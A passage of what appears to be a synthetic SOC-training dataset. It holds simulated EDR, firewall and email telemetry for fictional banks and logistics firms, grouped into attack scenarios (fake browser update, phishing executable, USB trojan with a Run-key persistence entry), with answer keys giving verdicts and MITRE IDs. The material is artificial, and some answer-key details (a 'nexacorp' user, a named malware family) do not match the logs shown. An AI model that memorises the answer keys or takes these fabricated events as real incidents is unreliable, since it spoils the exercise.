 "agentDetectionInfo": {
  "accountId": "1811388925835092259",
  "accountName": "Quantumbank",
  "agentDetectionState": null,
  "agentDomain": "QBANK",
  "agentIpV4": "10.100.1.108",
  "agentLastLoggedInUpn": "r.keller@quantumbank.ch",
  "agentLastLoggedInUserName": "r.keller",
  "agentMitigationMode": "detect",
  "agentOsName": "Windows 11 Enterprise",
  "agentOsRevision": "26100",
  "agentUuid": "627666a17149ecd25f452a1076bdab66",
  "agentVersion": "25.1.3.334",
  "externalIp": "213.100.197.10",
  "groupId": "1857524634001073935",
  "groupName": "Workstations",
  "siteId": "1894613334159270636",
  "siteName": "Quantumbank-HQ"
 },
 "agentRealtimeInfo": {
  "accountId": "1811388925835092259",
  "accountName": "Quantumbank",
  "activeThreats": 1,
  "agentComputerName": "WKS-QB-033",
  "agentDecommissionedAt": null,
  "agentDomain": "QBANK",
  "agentId": "1812471455189516334",
  "agentInfected": true,
  "agentIsActive": true,
  "agentIsDecommissioned": false,
  "agentMachineType": "desktop",
  "agentMitigationMode": "detect",
  "agentNetworkStatus": "connected",
  "agentOsName": "Windows 11 Enterprise",
  "agentOsRevision": "26100",
  "agentOsType": "windows",
  "agentUuid": "627666a17149ecd25f452a1076bdab66",
  "agentVersion": "25.1.3.334",
  "groupId": "1857524634001073935",
  "groupName": "Workstations",
  "networkInterfaces": [
   {
    "id": "1810224444949956322",
    "inet": [
     "10.100.1.108"
    ],
    "inet6": [
     "fe80::f004:5431:f360:f82"
    ],
    "name": "Ethernet",
    "physical": "8E:96:4A:38:A9:5B"
   }
  ],
  "operationalState": "na",
  "rebootRequired": false,
  "siteId": "1894613334159270636",
  "siteName": "Quantumbank-HQ",
  "userActionsNeeded": []
 },
 "containerInfo": {
  "id": null,
  "image": null,
  "labels": null,
  "name": null
 },
 "indicators": [
  {
   "category": "General",
   "description": "Malware.Generic",
   "ids": [
    18
   ],
   "tactics": [
    {
     "name": "Execution",
     "source": "MITRE",
     "techniques": [
      {
       "link": "https://attack.mitre.org/techniques/T1204/002/",
       "name": "T1204.002"
      }
     ]
    }
   ]
  }
 ],
 "kubernetesInfo": {
  "cluster": null,
  "controllerKind": null,
  "controllerLabels": null,
  "controllerName": null,
  "namespace": null,
  "namespaceLabels": null,
  "node": null,
  "pod": null,
  "podLabels": null
 },
 "mitigationStatus": [],
 "threatInfo": {
  "analystVerdict": "undefined",
  "analystVerdictDescription": "Undefined",
  "automaticallyResolved": false,
  "browserType": null,
  "certificateId": "",
  "classificati
```

- 2026-06-18T13:47:11.000Z | badge=edr | vendor=SentinelOne | sev=critical | host=WKS-QB-033 | user=r.keller | "wscript.exe started powershell.exe on WKS-QB-033"

NATIVE — SentinelOne Singularity (sentinelone/threat)
```json
{
 "id": "1838280307896853082",
 "agentDetectionInfo": {
  "accountId": "1811388925835092259",
  "accountName": "Quantumbank",
  "agentDetectionState": null,
  "agentDomain": "QBANK",
  "agentIpV4": "10.100.1.108",
  "agentLastLoggedInUpn": "r.keller@quantumbank.ch",
  "agentLastLoggedInUserName": "r.keller",
  "agentMitigationMode": "detect",
  "agentOsName": "Windows 11 Enterprise",
  "agentOsRevision": "26100",
  "agentUuid": "627666a17149ecd25f452a1076bdab66",
  "agentVersion": "25.1.3.334",
  "externalIp": "213.100.197.10",
  "groupId": "1857524634001073935",
  "groupName": "Workstations",
  "siteId": "1894613334159270636",
  "siteName": "Quantumbank-HQ"
 },
 "agentRealtimeInfo": {
  "accountId": "1811388925835092259",
  "accountName": "Quantumbank",
  "activeThreats": 1,
  "agentComputerName": "WKS-QB-033",
  "agentDecommissionedAt": null,
  "agentDomain": "QBANK",
  "agentId": "1812471455189516334",
  "agentInfected": true,
  "agentIsActive": true,
  "agentIsDecommissioned": false,
  "agentMachineType": "desktop",
  "agentMitigationMode": "detect",
  "agentNetworkStatus": "connected",
  "agentOsName": "Windows 11 Enterprise",
  "agentOsRevision": "26100",
  "agentOsType": "windows",
  "agentUuid": "627666a17149ecd25f452a1076bdab66",
  "agentVersion": "25.1.3.334",
  "groupId": "1857524634001073935",
  "groupName": "Workstations",
  "networkInterfaces": [
   {
    "id": "1810224444949956322",
    "inet": [
     "10.100.1.108"
    ],
    "inet6": [
     "fe80::f004:5431:f360:f82"
    ],
    "name": "Ethernet",
    "physical": "8E:96:4A:38:A9:5B"
   }
  ],
  "operationalState": "na",
  "rebootRequired": false,
  "siteId": "1894613334159270636",
  "siteName": "Quantumbank-HQ",
  "userActionsNeeded": []
 },
 "containerInfo": {
  "id": null,
  "image": null,
  "labels": null,
  "name": null
 },
 "indicators": [
  {
   "category": "General",
   "description": "Malware.Generic",
   "ids": [
    18
   ],
   "tactics": [
    {
     "name": "Execution",
     "source": "MITRE",
     "techniques": [
      {
       "link": "https://attack.mitre.org/techniques/T1059/001/",
       "name": "T1059.001"
      }
     ]
    }
   ]
  }
 ],
 "kubernetesInfo": {
  "cluster": null,
  "controllerKind": null,
  "controllerLabels": null,
  "controllerName": null,
  "namespace": null,
  "namespaceLabels": null,
  "node": null,
  "pod": null,
  "podLabels": null
 },
 "mitigationStatus": [],
 "threatInfo": {
  "analystVerdict": "undefined",
  "analystVerdictDescription": "Undefined",
  "automaticallyResolved": false,
  "browserType": null,
  "certificateId": "",
  "classificati
```

- 2026-06-18T13:47:12.000Z | badge=firewall | vendor=Palo Alto Networks | sev=high | host=WKS-QB-033 | user=r.keller | "Web request blocked for r.keller"

NATIVE — Palo Alto Networks PAN-OS (paloalto/THREAT)
```
<14>Jun 18 13:47:12 PA-3220-HQ 1,2026/06/18 13:47:12,013217932013,THREAT,url,2562,2026/06/18 13:47:12,10.100.1.108,45.61.136.90,213.100.197.10,45.61.136.90,BLOCK-NEWLY-REGISTERED,nexacorp\r.keller,,web-browsing,vsys1,trust,untrust,ethernet1/2,ethernet1/1,Panorama-Fwd,2026/06/18 13:47:12,979943,1,50557,443,39295,443,0x403000,tcp,block-url,"api-telemetry-sync.com/s/2",(9999),newly-registered-domain,informational,client-to-server,4051933674219709869,0x0,10.0.0.0-10.255.255.255,,,,0,,,1,,,,,,,,0,0,0,0,0,,PA-3220-HQ,,,,get,0,,0,,N/A,unknown,AppThreat-8988-9158,0x0,0,4294967295,,"newly-registered-domain,medium-risk",322c3b4e-877e-487e-929b-e299275c2427,0,,,,,,,,,WKS-QB-033,,,,,,,,,,,,,,,,,,,,,2026-06-18T13:47:12.000+00:00,,,,internet-utility,general-internet,browser-based,4,"used-by-malware,able-to-transfer-file,has-known-vulnerability,tunnel-other-application,pervasive-use",,web-browsing,no,no,,NonProxyTraffic,
```

- 2026-06-18T13:47:30.000Z | badge=edr | vendor=SentinelOne | sev=critical | host=WKS-QB-033 | user=r.keller | "Threat detected on WKS-QB-033"

NATIVE — SentinelOne Singularity (sentinelone/threat)
```json
{
 "id": "1810384113348240451",
 "agentDetectionInfo": {
  "accountId": "1811388925835092259",
  "accountName": "Quantumbank",
  "agentDetectionState": null,
  "agentDomain": "QBANK",
  "agentIpV4": "10.100.1.108",
  "agentLastLoggedInUpn": "r.keller@quantumbank.ch",
  "agentLastLoggedInUserName": "r.keller",
  "agentMitigationMode": "protect",
  "agentOsName": "Windows 11 Enterprise",
  "agentOsRevision": "26100",
  "agentUuid": "627666a17149ecd25f452a1076bdab66",
  "agentVersion": "25.1.3.334",
  "externalIp": "213.100.197.10",
  "groupId": "1857524634001073935",
  "groupName": "Workstations",
  "siteId": "1894613334159270636",
  "siteName": "Quantumbank-HQ"
 },
 "agentRealtimeInfo": {
  "accountId": "1811388925835092259",
  "accountName": "Quantumbank",
  "activeThreats": 0,
  "agentComputerName": "WKS-QB-033",
  "agentDecommissionedAt": null,
  "agentDomain": "QBANK",
  "agentId": "1812471455189516334",
  "agentInfected": false,
  "agentIsActive": true,
  "agentIsDecommissioned": false,
  "agentMachineType": "desktop",
  "agentMitigationMode": "protect",
  "agentNetworkStatus": "connected",
  "agentOsName": "Windows 11 Enterprise",
  "agentOsRevision": "26100",
  "agentOsType": "windows",
  "agentUuid": "627666a17149ecd25f452a1076bdab66",
  "agentVersion": "25.1.3.334",
  "groupId": "1857524634001073935",
  "groupName": "Workstations",
  "networkInterfaces": [
   {
    "id": "1810224444949956322",
    "inet": [
     "10.100.1.108"
    ],
    "inet6": [
     "fe80::f004:5431:f360:f82"
    ],
    "name": "Ethernet",
    "physical": "8E:96:4A:38:A9:5B"
   }
  ],
  "operationalState": "na",
  "rebootRequired": false,
  "siteId": "1894613334159270636",
  "siteName": "Quantumbank-HQ",
  "userActionsNeeded": []
 },
 "containerInfo": {
  "id": null,
  "image": null,
  "labels": null,
  "name": null
 },
 "indicators": [
  {
   "category": "General",
   "description": "Suspicious PowerShell download cradle launched by a script host",
   "ids": [
    842
   ],
   "tactics": [
    {
     "name": "Execution",
     "source": "MITRE",
     "techniques": [
      {
       "link": "https://attack.mitre.org/techniques/T1204/002/",
       "name": "T1204.002"
      }
     ]
    }
   ]
  }
 ],
 "kubernetesInfo": {
  "cluster": null,
  "controllerKind": null,
  "controllerLabels": null,
  "controllerName": null,
  "namespace": null,
  "namespaceLabels": null,
  "node": null,
  "pod": null,
  "podLabels": null
 },
 "mitigationStatus": [
  {
   "action": "kill",
   "actionsCounters": {
    "failed": 0,
    "notFound": 0,
    "pendingReboot": 0,
    "success": 1,
    "total":
```

#### ANSWER KEY — fake-browser-update
- evt_fbu_01_site_visit: verdict=- mitre=- authored: WKS-QB-033 loaded an article page on logisticsweekly.com, allowed under the category business-and-economy.
- evt_fbu_02_overlay_fetch: verdict=tp mitre=T1189 authored: During the same page view, the browser session requested /loader/update-check.js from cdn-static-assets-92.net, referred by the logisticsweekly.com article.
- evt_fbu_03_download: verdict=tp mitre=T1189 authored: The same host then downloaded Chrome_Update_127.0.6533.js from cdn-static-assets-92.net over the same session.
- evt_fbu_04_file_write: verdict=- mitre=- authored: chrome.exe wrote C:\Users\r.keller\Downloads\Chrome_Update_127.0.6533.js to disk.
- evt_fbu_05_wscript: verdict=tp mitre=T1204.002 authored: explorer.exe started wscript.exe with the downloaded .js file as its argument.
- evt_fbu_06_powershell: verdict=tp mitre=T1059.001 authored: wscript.exe spawned powershell.exe with a download-and-run command line pointing at api-telemetry-sync.com.
- evt_fbu_07_c2_blocked: verdict=tp mitre=T1105 authored: The outbound request to api-telemetry-sync.com/s/2 was denied under the category newly-registered-domain.
- evt_fbu_08_edr_alert: verdict=tp mitre=T1204.002 authored: SentinelOne raised a Critical detection on WKS-QB-033 for the explorer → wscript → powershell chain and killed the PowerShell process.


## globallogis — stack {"edr":"mde","firewall":"checkpoint","idp":"okta"} (effective products: edr=Microsoft Defender for Endpoint, firewall=Check Point, idp=Okta)

### Background feed sample (benign noise)

- 2026-05-10T06:00:00.000Z | badge=ad | vendor=Windows Security | sev=informational | host=WS-LOG-045 | user=h.muller | "Signed in to WS-LOG-045"

LEGACY VIEW (no native module) raw:
```json
{
 "winlog.event_id": "4624",
 "winlog.event_data.LogonType": "2",
 "action_result": "allowed"
}
```

- 2026-05-10T09:15:00.000Z | badge=linux_audit | vendor=Linux auditd | sev=high | host=SRV-GL-LINUX01 | user=- | "SRV-GL-LINUX01 ran fail2ban-server on SRV-GL-LINUX01"

NATIVE — Linux auditd (linux_auditd/EXECVE)
```
type=EXECVE msg=audit(1778404500.000:908157): argc=5 a0="fail2ban-client" a1="set" a2="sshd" a3="banip" a4="45.142.212.100"
```


### Story: phishing-malware (foundation) — Phishing Attachment → Malware Execution → Workstation Compromise

- 2026-05-20T10:15:00.000Z | badge=o365 | vendor=Microsoft Defender for Office 365 | sev=medium | host=- | user=h.schneider | "Received an email"

NATIVE — Microsoft Defender for Office 365 (defender_o365/EmailEvents)
```json
{
 "time": "2026-05-20T10:15:02.0000000Z",
 "tenantId": "a43db5fa-ceaf-48b6-a385-9d6162805228",
 "category": "AdvancedHunting-EmailEvents",
 "properties": {
  "Timestamp": "2026-05-20T10:15:00.0003072Z",
  "NetworkMessageId": "e7a91c4f-3b62-4d18-9e05-6c8f2a7b19e3",
  "InternetMessageId": "<3f8b2a71-shiptrack-delivery-48213@shiptrack-express.info>",
  "SenderMailFromAddress": "notifications@shiptrack-express.info",
  "SenderFromAddress": "notifications@shiptrack-express.info",
  "SenderDisplayName": "",
  "SenderObjectId": "",
  "SenderMailFromDomain": "shiptrack-express.info",
  "SenderFromDomain": "shiptrack-express.info",
  "SenderIPv4": "45.148.10.77",
  "SenderIPv6": "",
  "RecipientEmailAddress": "h.schneider@globallogis.de",
  "RecipientObjectId": "24ab8150-ce4b-4c60-b698-4f64082b5ddf",
  "Subject": "Your Package Could Not Be Delivered — Action Required",
  "EmailClusterId": 3019487618724,
  "EmailDirection": "Inbound",
  "DeliveryAction": "Delivered",
  "DeliveryLocation": "Inbox/folder",
  "ThreatTypes": "Phish",
  "ThreatNames": "",
  "DetectionMethods": "{\"Phish\":[\"File detonation reputation\"]}",
  "ConfidenceLevel": "{\"Phish\":\"High\",\"Spam\":\"1\"}",
  "BulkComplaintLevel": 0,
  "EmailAction": "No action taken",
  "EmailActionPolicy": "",
  "EmailActionPolicyGuid": "",
  "AuthenticationDetails": "{\"SPF\":\"fail\",\"DKIM\":\"fail\",\"DMARC\":\"fail\",\"CompAuth\":\"fail\"}",
  "AttachmentCount": 1,
  "UrlCount": 0,
  "EmailLanguage": "en",
  "Connectors": "",
  "OrgLevelAction": "",
  "OrgLevelPolicy": "",
  "UserLevelAction": "",
  "UserLevelPolicy": "",
  "ReportId": "e7a91c4f-3b62-4d18-9e05-6c8f2a7b19e3-1825415273328190304-1",
  "AdditionalFields": "{}",
  "OriginalThreatTypes": "Phish",
  "OriginalDetectionMethods": "{\"Phish\":[\"File detonation reputation\"]}",
  "OriginalConfidenceLevel": "{\"Phish\":\"High\",\"Spam\":\"1\"}",
  "To": "h.schneider@globallogis.de",
  "Cc": "",
  "RecipientDomain": "globallogis.de",
  "EmailSize": 52582,
  "IsFirstContact": 1
 }
}
```

- 2026-05-20T10:21:00.000Z | badge=edr | vendor=Microsoft Defender for Endpoint | sev=high | host=WH-TERM-005 | user=h.schneider | "explorer.exe started Delivery_Notice_48213.pdf.exe on WH-TERM-005"

NATIVE — Microsoft Defender for Endpoint (mde/DeviceProcessEvents)
```json
{
 "time": "2026-05-20T10:21:02.6132504Z",
 "tenantId": "a43db5fa-ceaf-48b6-a385-9d6162805228",
 "operationName": "Publish",
 "category": "AdvancedHunting-DeviceProcessEvents",
 "properties": {
  "Timestamp": "2026-05-20T10:21:00.0000100Z",
  "DeviceId": "ced4ccd1aff70d5b8c39e0cd7e9f54318be10106",
  "DeviceName": "WH-TERM-005",
  "ActionType": "ProcessCreated",
  "FileName": "Delivery_Notice_48213.pdf.exe",
  "FolderPath": "C:\\Users\\h.schneider\\Downloads\\Delivery_Notice_48213.pdf.exe",
  "SHA1": "32669a8b084394672d4bdcf1d33258bda55a6f51",
  "SHA256": "b233d674e7dc3fe283d858e8bbb0423c88dfba9b23eb9ca9ca9701c7da1186a8",
  "MD5": null,
  "ProcessId": 6624,
  "ProcessCommandLine": "\"C:\\Users\\h.schneider\\Downloads\\Delivery_Notice_48213.pdf.exe\"",
  "ProcessIntegrityLevel": "Medium",
  "ProcessTokenElevation": "TokenElevationTypeLimited",
  "ProcessCreationTime": "2026-05-20T10:20:59.9990012Z",
  "AccountDomain": "GLOBALLOGIS",
  "AccountName": "h.schneider",
  "AccountSid": "S-1-5-21-1998959984-2015737603-2032515222-4256",
  "AccountUpn": "h.schneider@globallogis.de",
  "AccountObjectId": "3d290f2c-f315-4a2b-9702-a5aa23b632af",
  "LogonId": 9561020,
  "InitiatingProcessFileName": "explorer.exe",
  "InitiatingProcessFolderPath": null,
  "InitiatingProcessCommandLine": null,
  "InitiatingProcessId": 3140,
  "InitiatingProcessSHA1": "57583ca811cc733cb599a606b333075a7ccc1d12",
  "InitiatingProcessSHA256": null,
  "InitiatingProcessMD5": null,
  "InitiatingProcessParentFileName": null,
  "InitiatingProcessParentId": null,
  "InitiatingProcessAccountDomain": "GLOBALLOGIS",
  "InitiatingProcessAccountName": "h.schneider",
  "InitiatingProcessAccountSid": "S-1-5-21-1998959984-2015737603-2032515222-4256",
  "InitiatingProcessAccountUpn": "h.schneider@globallogis.de",
  "InitiatingProcessAccountObjectId": "3d290f2c-f315-4a2b-9702-a5aa23b632af",
  "InitiatingProcessLogonId": 9561020,
  "InitiatingProcessIntegrityLevel": "Medium",
  "InitiatingProcessTokenElevation": "TokenElevationTypeLimited",
  "InitiatingProcessUniqueId": "30000753812535",
  "InitiatingProcessSessionId": 1,
  "IsInitiatingProcessRemoteSession": false,
  "ProcessUniqueId": "30003389831220",
  "CreatedProcessSessionId": 1,
  "IsProcessRemoteSession": false,
  "AdditionalFields": null,
  "ReportId": 384967,
  "AppGuardContainerId": null,
  "MachineGroup": "Workstations"
 }
}
```

- 2026-05-20T10:21:45.000Z | badge=firewall | vendor=Check Point | sev=high | host=WH-TERM-005 | user=h.schneider | "WH-TERM-005 connected to shiptrack-updates-net.xyz"

NATIVE — Check Point Quantum Security Gateway (checkpoint/url_filtering)
```
<134>1 2026-05-20T10:21:45Z gw-hq-01 CheckPoint 26144 - [action:"Accept"; flags:"411908"; ifdir:"outbound"; ifname:"eth1"; logid:"0"; loguid:"{0x6a0d8b39,0x2a,0xf4f09d61,0xfef641db}"; origin:"10.50.0.1"; originsicname:"CN=gw-hq-01,O=mgmt-hq.globallogis.eu.bc4cf7"; sequencenum:"1"; time:"1779272505"; version:"5"; __policy_id_tag:"product=VPN-1 & FireWall-1[db_tag={D19702A6-6F0E-4EBF-B496-BD6512D79DC9};mgmt=mgmt-hq;date=1779148800;policy_name=Corp_Policy\]"; app_category:"Uncategorized"; app_id:"0"; app_risk:"0"; appi_name:"shiptrack-updates-net.xyz"; dst:"185.220.101.204"; inzone:"Internal"; layer_name:"Network"; layer_name:"Web Control"; layer_uuid:"251569ef-12c5-420d-9500-84fd87381ec3"; layer_uuid:"8e0d9108-deab-4b5e-9eba-eac488132bb7"; match_id:"58"; match_id:"33554461"; matched_category:"Uncategorized"; parent_rule:"0"; parent_rule:"58"; product:"URL Filtering"; proto:"6"; proxy_src_ip:"10.50.10.63"; resource:"https://shiptrack-updates-net.xyz"; rule_action:"Inline"; rule_action:"Accept"; rule_name:"ALLOW-OUTBOUND-HTTPS"; rule_name:"Allow uncategorized"; rule_uid:"c65bb33b-787f-41e5-881d-6832b2ba4ed1"; rule_uid:"9784c87f-3d28-4571-8a8c-01463286e5f9"; outzone:"External"; s_port:"51204"; service:"443"; service_id:"https"; src:"10.50.10.63"; src_machine_name:"WH-TERM-005"; src_user_name:"h.schneider"; xlatesrc:"62.184.27.10"; xlatesport:"31503"; xlatedst:"0.0.0.0"; xlatedport:"0"]
```

- 2026-05-20T10:24:00.000Z | badge=edr | vendor=Microsoft Defender for Endpoint | sev=critical | host=WH-TERM-005 | user=h.schneider | "Threat detected on WH-TERM-005"

NATIVE — Microsoft Defender for Endpoint (mde/AlertEvidence)
```json
{
 "time": "2026-05-20T10:24:01.7559714Z",
 "tenantId": "a43db5fa-ceaf-48b6-a385-9d6162805228",
 "operationName": "Publish",
 "category": "AdvancedHunting-AlertEvidence",
 "properties": {
  "Timestamp": "2026-05-20T10:24:00.0009658Z",
  "AlertId": "da916276458899498839_435237572",
  "Title": "Malware was prevented",
  "Categories": "[\"Execution\"]",
  "AttackTechniques": "[\"Malicious File (T1204.002)\"]",
  "ServiceSource": "Microsoft Defender for Endpoint",
  "DetectionSource": "Antivirus",
  "EntityType": "File",
  "EvidenceRole": "Related",
  "EvidenceDirection": null,
  "FileName": "Delivery_Notice_48213.pdf.exe",
  "FolderPath": "C:\\Users\\h.schneider\\Downloads",
  "SHA1": "32669a8b084394672d4bdcf1d33258bda55a6f51",
  "SHA256": "b233d674e7dc3fe283d858e8bbb0423c88dfba9b23eb9ca9ca9701c7da1186a8",
  "FileSize": 391168,
  "ThreatFamily": null,
  "RemoteIP": null,
  "RemoteUrl": null,
  "AccountName": null,
  "AccountDomain": null,
  "AccountSid": null,
  "AccountObjectId": null,
  "AccountUpn": null,
  "DeviceId": "ced4ccd1aff70d5b8c39e0cd7e9f54318be10106",
  "DeviceName": "WH-TERM-005",
  "LocalIP": null,
  "ProcessCommandLine": null,
  "RegistryKey": null,
  "RegistryValueName": null,
  "RegistryValueData": null,
  "AdditionalFields": null,
  "Severity": "High",
  "MachineGroup": "Workstations"
 }
}
```

#### ANSWER KEY — phishing-malware
- evt_pm_01_email: verdict=tp mitre=T1566.001 authored: h.schneider received an email with a ZIP attachment (Delivery_Notice_48213.zip) from an external sender impersonating a shipping company. SPF and DKIM both failed.
- evt_pm_02_execute: verdict=tp mitre=T1204.002 authored: h.schneider extracted the ZIP and ran Delivery_Notice_48213.pdf.exe from the Downloads folder on WH-TERM-005; explorer.exe was the parent process.
- evt_pm_03_beacon: verdict=tp mitre=T1071.001 authored: WH-TERM-005 opened an outbound HTTPS session to shiptrack-updates-net.xyz, a domain registered 2 days ago; the firewall allowed the session.
- evt_pm_04_detect: verdict=tp mitre=T1204.002 authored: Microsoft Defender for Endpoint quarantined Delivery_Notice_48213.pdf.exe on WH-TERM-005, matching a known commodity trojan signature (family: Glupteba-variant).


### Story: usb-malware (foundation) — Malicious USB Drive → Trojan Persistence → Workstation Compromise

- 2026-05-22T13:30:00.000Z | badge=edr | vendor=Microsoft Defender for Endpoint | sev=low | host=WH-TERM-005 | user=h.schneider | "USB_Backup_Tool.exe was copied from a removable USB drive (E:\) to the Desktop on WH-TERM-005."

NATIVE — Microsoft Defender for Endpoint (mde/DeviceFileEvents)
```json
{
 "time": "2026-05-22T13:30:04.8824670Z",
 "tenantId": "a43db5fa-ceaf-48b6-a385-9d6162805228",
 "operationName": "Publish",
 "category": "AdvancedHunting-DeviceFileEvents",
 "properties": {
  "Timestamp": "2026-05-22T13:30:00.0009158Z",
  "DeviceId": "ced4ccd1aff70d5b8c39e0cd7e9f54318be10106",
  "DeviceName": "WH-TERM-005",
  "ActionType": "FileCreated",
  "FileName": "USB_Backup_Tool.exe",
  "FolderPath": "C:\\Users\\h.schneider\\Desktop\\USB_Backup_Tool.exe",
  "SHA1": "a6fc584ea1cc5d80583678eff75963588d276b5c",
  "SHA256": "e5f78b3e3cd7901e89bfd8da08ff1dd412acf7452ba5027f031c6efe64e7196f",
  "MD5": null,
  "FileSize": 245760,
  "FileOriginUrl": null,
  "FileOriginIP": null,
  "PreviousFileName": null,
  "PreviousFolderPath": null,
  "InitiatingProcessFileName": null,
  "InitiatingProcessFolderPath": null,
  "InitiatingProcessCommandLine": null,
  "InitiatingProcessId": null,
  "InitiatingProcessSHA1": null,
  "InitiatingProcessSHA256": null,
  "InitiatingProcessMD5": null,
  "InitiatingProcessParentFileName": null,
  "InitiatingProcessParentId": null,
  "InitiatingProcessAccountDomain": "GLOBALLOGIS",
  "InitiatingProcessAccountName": "h.schneider",
  "InitiatingProcessAccountSid": "S-1-5-21-1998959984-2015737603-2032515222-4256",
  "InitiatingProcessAccountUpn": "h.schneider@globallogis.de",
  "InitiatingProcessAccountObjectId": "3d290f2c-f315-4a2b-9702-a5aa23b632af",
  "InitiatingProcessLogonId": 9561020,
  "InitiatingProcessIntegrityLevel": "Medium",
  "InitiatingProcessTokenElevation": "TokenElevationTypeLimited",
  "InitiatingProcessUniqueId": null,
  "InitiatingProcessSessionId": 1,
  "IsInitiatingProcessRemoteSession": false,
  "RequestProtocol": "Local",
  "RequestSourceIP": null,
  "RequestAccountName": "h.schneider",
  "RequestAccountDomain": "GLOBALLOGIS",
  "RequestAccountSid": "S-1-5-21-1998959984-2015737603-2032515222-4256",
  "ShareName": null,
  "AdditionalFields": null,
  "ReportId": 918553,
  "AppGuardContainerId": null,
  "MachineGroup": "Workstations"
 }
}
```

- 2026-05-22T13:33:00.000Z | badge=edr | vendor=Microsoft Defender for Endpoint | sev=high | host=WH-TERM-005 | user=h.schneider | "explorer.exe started USB_Backup_Tool.exe on WH-TERM-005"

NATIVE — Microsoft Defender for Endpoint (mde/DeviceProcessEvents)
```json
{
 "time": "2026-05-22T13:33:03.3618031Z",
 "tenantId": "a43db5fa-ceaf-48b6-a385-9d6162805228",
 "operationName": "Publish",
 "category": "AdvancedHunting-DeviceProcessEvents",
 "properties": {
  "Timestamp": "2026-05-22T13:33:00.0002383Z",
  "DeviceId": "ced4ccd1aff70d5b8c39e0cd7e9f54318be10106",
  "DeviceName": "WH-TERM-005",
  "ActionType": "ProcessCreated",
  "FileName": "USB_Backup_Tool.exe",
  "FolderPath": "C:\\Users\\h.schneider\\Desktop\\USB_Backup_Tool.exe",
  "SHA1": "a6fc584ea1cc5d80583678eff75963588d276b5c",
  "SHA256": "e5f78b3e3cd7901e89bfd8da08ff1dd412acf7452ba5027f031c6efe64e7196f",
  "MD5": null,
  "ProcessId": 7712,
  "ProcessCommandLine": "\"C:\\Users\\h.schneider\\Desktop\\USB_Backup_Tool.exe\"",
  "ProcessIntegrityLevel": "Medium",
  "ProcessTokenElevation": "TokenElevationTypeLimited",
  "ProcessCreationTime": "2026-05-22T13:32:59.9994421Z",
  "AccountDomain": "GLOBALLOGIS",
  "AccountName": "h.schneider",
  "AccountSid": "S-1-5-21-1998959984-2015737603-2032515222-4256",
  "AccountUpn": "h.schneider@globallogis.de",
  "AccountObjectId": "3d290f2c-f315-4a2b-9702-a5aa23b632af",
  "LogonId": 9561020,
  "InitiatingProcessFileName": "explorer.exe",
  "InitiatingProcessFolderPath": null,
  "InitiatingProcessCommandLine": null,
  "InitiatingProcessId": 3140,
  "InitiatingProcessSHA1": "57583ca811cc733cb599a606b333075a7ccc1d12",
  "InitiatingProcessSHA256": null,
  "InitiatingProcessMD5": null,
  "InitiatingProcessParentFileName": null,
  "InitiatingProcessParentId": null,
  "InitiatingProcessAccountDomain": "GLOBALLOGIS",
  "InitiatingProcessAccountName": "h.schneider",
  "InitiatingProcessAccountSid": "S-1-5-21-1998959984-2015737603-2032515222-4256",
  "InitiatingProcessAccountUpn": "h.schneider@globallogis.de",
  "InitiatingProcessAccountObjectId": "3d290f2c-f315-4a2b-9702-a5aa23b632af",
  "InitiatingProcessLogonId": 9561020,
  "InitiatingProcessIntegrityLevel": "Medium",
  "InitiatingProcessTokenElevation": "TokenElevationTypeLimited",
  "InitiatingProcessUniqueId": "30000753812535",
  "InitiatingProcessSessionId": 1,
  "IsInitiatingProcessRemoteSession": false,
  "ProcessUniqueId": "30004021119659",
  "CreatedProcessSessionId": 1,
  "IsProcessRemoteSession": false,
  "AdditionalFields": null,
  "ReportId": 59276,
  "AppGuardContainerId": null,
  "MachineGroup": "Workstations"
 }
}
```

- 2026-05-22T13:33:20.000Z | badge=edr | vendor=Microsoft Defender for Endpoint | sev=high | host=WH-TERM-005 | user=h.schneider | "A process set registry value SystemBackupSvc on WH-TERM-005"

NATIVE — Microsoft Defender for Endpoint (mde/DeviceRegistryEvents)
```json
{
 "time": "2026-05-22T13:33:25.0977475Z",
 "tenantId": "a43db5fa-ceaf-48b6-a385-9d6162805228",
 "operationName": "Publish",
 "category": "AdvancedHunting-DeviceRegistryEvents",
 "properties": {
  "Timestamp": "2026-05-22T13:33:20.0000131Z",
  "DeviceId": "ced4ccd1aff70d5b8c39e0cd7e9f54318be10106",
  "DeviceName": "WH-TERM-005",
  "ActionType": "RegistryValueSet",
  "RegistryKey": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
  "RegistryValueName": "SystemBackupSvc",
  "RegistryValueData": "C:\\Users\\h.schneider\\Desktop\\USB_Backup_Tool.exe",
  "PreviousRegistryKey": null,
  "PreviousRegistryValueName": null,
  "PreviousRegistryValueData": null,
  "InitiatingProcessFileName": "USB_Backup_Tool.exe",
  "InitiatingProcessFolderPath": null,
  "InitiatingProcessCommandLine": null,
  "InitiatingProcessId": 4216,
  "InitiatingProcessSHA1": "a6fc584ea1cc5d80583678eff75963588d276b5c",
  "InitiatingProcessSHA256": "e5f78b3e3cd7901e89bfd8da08ff1dd412acf7452ba5027f031c6efe64e7196f",
  "InitiatingProcessMD5": null,
  "InitiatingProcessParentFileName": null,
  "InitiatingProcessParentId": null,
  "InitiatingProcessAccountDomain": "GLOBALLOGIS",
  "InitiatingProcessAccountName": "h.schneider",
  "InitiatingProcessAccountSid": "S-1-5-21-1998959984-2015737603-2032515222-4256",
  "InitiatingProcessAccountUpn": "h.schneider@globallogis.de",
  "InitiatingProcessAccountObjectId": "3d290f2c-f315-4a2b-9702-a5aa23b632af",
  "InitiatingProcessLogonId": 9561020,
  "InitiatingProcessIntegrityLevel": "Medium",
  "InitiatingProcessTokenElevation": "TokenElevationTypeLimited",
  "InitiatingProcessUniqueId": "30003991068687",
  "InitiatingProcessSessionId": 1,
  "IsInitiatingProcessRemoteSession": false,
  "AdditionalFields": null,
  "ReportId": 896152,
  "AppGuardContainerId": null,
  "MachineGroup": "Workstations"
 }
}
```

- 2026-05-22T13:35:00.000Z | badge=edr | vendor=Microsoft Defender for Endpoint | sev=critical | host=WH-TERM-005 | user=h.schneider | "Threat detected on WH-TERM-005"

NATIVE — Microsoft Defender for Endpoint (mde/AlertEvidence)
```json
{
 "time": "2026-05-22T13:35:04.2484191Z",
 "tenantId": "a43db5fa-ceaf-48b6-a385-9d6162805228",
 "operationName": "Publish",
 "category": "AdvancedHunting-AlertEvidence",
 "properties": {
  "Timestamp": "2026-05-22T13:35:00.0005535Z",
  "AlertId": "da311678881261346024_-169360005",
  "Title": "Malware was prevented",
  "Categories": "[\"Persistence\"]",
  "AttackTechniques": "[\"Registry Run Keys / Startup Folder (T1547.001)\"]",
  "ServiceSource": "Microsoft Defender for Endpoint",
  "DetectionSource": "Antivirus",
